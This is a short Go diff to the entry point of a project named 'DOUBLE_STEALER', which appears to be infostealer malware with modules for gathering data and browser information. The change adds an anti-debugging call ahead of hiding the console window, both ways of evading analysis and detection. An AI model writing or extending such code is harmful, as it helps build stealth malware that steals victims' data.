@@ -1,6 +1,7 @@
 package main
 
 import (
+	"DOUBLE_STEALER/antibug"
 	"DOUBLE_STEALER/creation" // pour le module creation
 	"DOUBLE_STEALER/getdata"  // pour le module Get_Data
 	"DOUBLE_STEALER/getnav"   // pour le module Get_Nav
@@ -12,6 +13,7 @@ import (
 )
 
 func main() {
+	antibug.RunAntiDebugEffect()
 	// Cacher la fenêtre, à mettre avant l'exécution du programme
 	hide.HideConsole()
 
